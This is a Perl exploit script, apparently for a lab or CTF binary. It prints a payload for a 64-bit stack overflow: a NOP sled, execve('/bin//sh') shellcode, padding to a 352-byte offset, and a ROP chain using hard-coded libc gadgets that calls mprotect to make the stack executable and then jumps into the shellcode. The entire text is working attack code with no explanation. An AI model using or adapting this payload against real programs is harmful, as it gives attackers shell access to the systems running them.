#!/usr/bin/perl


$| = 1;


######################################


$libc_base = 0x00007ffff7dda000; 

$nopsled = "\x90" x 30;
$shellcode = "\x48\x31\xc0\x48\x89\xc2\x48\x89\xd6\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x48\x83\xc0\x3b\x0f\x05";

$payload = "A" x (352 - length($nopsled) - length($shellcode));
$payload .= "B" x 8; # RBP
$payload .= pack("Q", $libc_base + 0x0000000000026796); # pop rdi, ret
$payload .= pack("Q", 0x00007ffffffde000); # stack_base
$payload .= pack("Q", $libc_base + 0x000000000002890f); # pop rsi, ret
$payload .= pack("Q", 0x01010101); # length
$payload .= pack("Q", $libc_base + 0x00000000000cb1cd); # pop rdx; pop r12; ret;
$payload .= pack("Q", 0x7); # flag RWX
$payload .= pack("Q", 0x7ffff7ed3c20); # mprotect
$payload .= pack("Q", 0x7fffffffde2e); # RIP

print $nopsled . $shellcode . $payload;


######################################


